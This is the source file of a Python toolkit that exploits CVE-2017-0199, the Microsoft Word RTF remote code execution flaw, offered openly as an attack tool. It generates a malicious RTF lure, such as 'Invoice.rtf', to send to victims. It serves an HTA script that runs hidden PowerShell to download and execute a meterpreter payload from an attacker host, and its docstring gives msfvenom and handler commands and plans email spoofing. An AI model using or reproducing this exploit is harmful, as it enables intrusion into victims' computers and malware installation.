'''

## Exploit toolkit CVE-2017-0199 - v2.0 (https://github.com/bhdresh/CVE-2017-0199) ##



Exploit toolkit CVE-2017-0199 - v2.0 is a handy python script which provides a quick and effective way to exploit Microsoft RTF RCE. It could generate a malicious RTF file and deliver metasploit / meterpreter payload to victim without any complex configuration.


### Video tutorial

https://youtu.be/42LjG7bAvpg


### Release note:

Introduced following capabilities to the script

	- Generate Malicious RTF file using toolkit
	- Run toolkit in an exploitation mode as tiny HTA + Web server
	
Version: Python version 2.7.13

### Future release:

Working on following feature

	- Automatically send generated malicious RTF to victim using email spoofing
		
### Example:

- Step 1: Generate malicious RTF file using following command and send it to victim

    	Syntax:
    
    	# python cve-2017-0199_toolkit.py -M gen -w <filename.rtf> -u <http://attacker.com/test.hta>
    
    	Example:
    
    	# python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc
    
    
- Step 2 (Optional, if using MSF Payload) : Generate metasploit payload and start handler
    
    	Example:
    
    	Generate Payload:
	
    	# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
	
        Start Handler:
	
        # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
	
    
- Step 3: Start toolkit in exploitation mode to deliver payloads
    
    	Syntax:
    
    	# python cve-2017-0199_toolkit.py -M exp -e <http://attacker.com/shell.exe> -l </tmp/shell.exe>
    
    	Example:
    
    	# python cve-2017-0199_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
    
    
    
### Command line arguments:

    # python cve-2017-0199_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-0199 (Microsoft Word RTF RCE)

    Modes:

    -M gen                                          Generate Malicious RTF file only

         Generate malicious RTF file:

          -w <Filename.rtf>                   Name of malicious RTF file (Share this file with victim).

          -u <http://attacker.com/test.hta>   The path to an hta file. Normally, this should be a domain or IP where this tool is running.

                                                 For example, http://attackerip.com/test.hta (This URL will be included in malicious RTF file and

                                                 will be requested once victim will open malicious RTF file.
    -M exp                                          Start exploitation mode

         Exploitation:

          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 Local path of an executable file / meterpreter shell / payload (If payload is hosted locally).

          
'''

import os,sys,thread,socket,sys,getopt

BACKLOG = 50            # how many pending connections queue will hold
MAX_DATA_RECV = 999999  # max number of bytes we receive at once
DEBUG = True            # set to True to see the debug msgs
def main(argv):
    # Host and Port information
    global port
    global host
    global filename
    global docuri
    global payloadurl
    global payloadlocation
    global mode
    filename = ''
    docuri = ''
    payloadurl = ''
    payloadlocation = ''
    port = int("80")
    host = ''
    mode = ''
    # Capture command line arguments
    try:
        opts, args = getopt.getopt(argv,"hM:w:u:p:e:l:",["mode=","filename=","docuri=","port=","payloadurl=","payloadlocation="])
    except getopt.GetoptError:
        print 'Usage: python '+sys.argv[0]+' -h'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
                print "\nThis is a handy toolkit to exploit CVE-2017-0199 (Microsoft Word RTF RCE)\n"
                print "Modes:\n"
                print " -M gen                                          Generate Malicious RTF file only\n"
                print "             Generate malicious RTF file:\n"
                print "             -w <Filename.rtf>                   Name of malicious RTF file (Share this file with victim).\n"
                print "             -u <http://attacker.com/test.hta>   The path to an hta file. Normally, this should be a domain or IP where this tool is running.\n"
                print "                                                 For example, http://attackerip.com/test.hta (This URL will be included in malicious RTF file and\n"
                print "                                                 will be requested once victim will open malicious RTF file.\n"
                print " -M exp                                          Start exploitation mode\n"
                print "             Exploitation:\n"
                print "             -p <TCP port:Default 80>            Local port number.\n"
                print "             -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.\n"
                print "             -l </tmp/shell.exe>                 Local path of an executable file / meterpreter shell / payload (If payload is hosted locally).\n"
                sys.exit()
        elif opt in ("-M","--mode"):
            mode = arg
        elif opt in ("-w", "--filename"):
            filename = arg
        elif opt in ("-u", "--docuri"):
            docuri = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ("-e", "--payloadurl"):
            payloadurl = arg
        elif opt in ("-l", "--payloadlocation"):
            payloadlocation = arg
    if "gen" in mode:
        if (len(filename)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        if (len(docuri)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        print "Generating payload"
        generate_exploit_rtf()
        mode = 'Finished'
    if "exp" in mode:
        if (len(payloadurl)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        if (len(payloadlocation)<1):
            print 'Usage: python '+sys.argv[0]+' -h'
            sys.exit()
        print "Running exploit mode - waiting for victim to connect"
        exploitation()
        mode = 'Finished'
    if not "Finished" in mode:
        print 'Usage: python '+sys.argv[0]+' -h'
        sys.exit()
def generate_exploit_rtf():
    # Preparing malicious Doc
    s = docuri
    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
    docuri_pad_len = 224 - len(docuri_hex)
    docuri_pad = "0"*docuri_pad_len
    uri_hex = "010000020900000001000000000000000000000000000000a4000000e0c9ea79f9bace118c8200aa004ba90b8c000000"+docuri_hex+docuri_pad+"00000000795881f43b1d7f48af2c825dc485276300000000a5ab0000ffffffff0609020000000000c00000000000004600000000ffffffff0000000000000000906660a637b5d201000000000000000000000000000000000000000000000000100203000d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    
    payload = "{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"
    payload += "{\\info\n"
    payload += "{\\author }\n"
    payload += "{\\operator }\n"
    payload += "}\n"
    payload += "{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\n"
    payload += "{\n"
    payload += "{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"
    payload += "{\\*\\objclass Word.Document.8}\n"
    payload += "{\\*\\objdata 0105000002000000\n"
    payload += "090000004f4c45324c696e6b000000000000000000000a0000\n"
    payload += "d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "fffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff020000000003000000000000c000000000000046000000000000000000000000704d\n"
    payload += "6ca637b5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000\n"
    payload += "000000000000000000000000f00000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000\n"
    payload += "0000000000000000000004000000060000000000000003004c0069006e006b0049006e0066006f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000200ffffffffffffffffffffffff000000000000000000000000000000000000000000000000\n"
    payload += "00000000000000000000000005000000b700000000000000010000000200000003000000fefffffffeffffff0600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n"
    payload += uri_hex+"\n"
    payload += "0105000000000000}\n"
    payload += "{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}}\n"
    payload += "{\\*\\datastore }\n"
    payload += "}\n"
    f = open(filename, 'w')
    f.write(payload)
    f.close()
    print "Generated "+filename+" successfully"

def exploitation():
 
    print "Server Running on ",host,":",port

    try:
        # create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # associate the socket to host and port
        s.bind((host, port))

        # listenning
        s.listen(BACKLOG)
    
    except socket.error, (value, message):
        if s:
            s.close()
        print "Could not open socket:", message
        sys.exit(1)

    # get the connection from client
    while 1:
        conn, client_addr = s.accept()

        # create a thread to handle request
        thread.start_new_thread(server_thread, (conn, client_addr))
        
    s.close()

def server_thread(conn, client_addr):

    # get the request from browser
    try:
        request = conn.recv(MAX_DATA_RECV)
        if (len(request) > 0):
            # parse the first line
            first_line = request.split('\n')[0]
            
            # get method
            method = first_line.split(' ')[0]
            # get url
            try:
                url = first_line.split(' ')[1]
            except IndexError:
                print "Invalid request from "+client_addr[0]
                conn.close()
                sys.exit(1)
            check_exe_request = url.find('.exe')
            if (check_exe_request > 0):
                print "Received request for payload from "+client_addr[0]
                try:
                    size = os.path.getsize(payloadlocation)
                except OSError:
                    print "Unable to read"+payloadlocation
                    conn.close()
                    sys.exit(1)
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 18:56:41 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 16:56:22 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: "+str(size)+"\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/x-msdos-program\r\n\r\n"
                with open(payloadlocation) as fin:
                    data +=fin.read()
                    conn.send(data)
                    conn.close()
                    sys.exit(1)
            if method in ['GET', 'get']:
                print "Received GET method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 315\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/hta\r\n\r\n<script>\na=new ActiveXObject(\"WScript.Shell\");\na.run('%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\\'"+payloadurl+"\\', \\'c:/windows/temp/shell.exe\\'); c:/windows/temp/shell.exe', 0);window.close();\n</script>\r\n"
                conn.send(data)
                conn.close()
            if method in ['OPTIONS', 'options']:
                print "Receiver OPTIONS method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:47:14 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nAllow: OPTIONS,HEAD,GET\r\nContent-Length: 0\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: text/html"
                conn.send(data)
                conn.close()
            if method in ['HEAD', 'head']:
                print "Received HEAD method from "+client_addr[0]
                data = "HTTP/1.1 200 OK\r\nDate: Sun, 16 Apr 2017 17:11:03 GMT\r\nServer: Apache/2.4.25 (Debian)\r\nLast-Modified: Sun, 16 Apr 2017 17:30:47 GMT\r\nAccept-Ranges: bytes\r\nContent-Length: 315\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nContent-Type: application/doc\r\n\r\n"
                conn.send(data)
                conn.close()
                sys.exit(1)
    except socket.error, ex:
        print ex
if __name__ == '__main__':
    main(sys.argv[1:])